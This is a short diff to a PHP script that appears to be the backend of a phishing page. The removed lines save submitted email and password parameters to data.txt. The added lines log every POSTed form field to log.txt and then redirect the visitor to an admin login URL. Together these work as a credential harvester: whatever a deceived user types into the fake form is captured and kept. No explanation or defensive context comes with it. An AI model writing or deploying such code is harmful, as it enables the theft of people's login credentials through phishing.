@@ -1,9 +1,13 @@
 <?php
-$data=$_GET['email'];
-$data2=$_GET['password'];
-$fp = fopen('data.txt', 'a');
-fwrite($fp, $data);
-fwrite($fp, $data2);
-fclose($fp);
 header("Location: https://admin.vizionary.com");
+$handle = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n\n\n\n");
+fclose($handle);
+exit;
 ?>
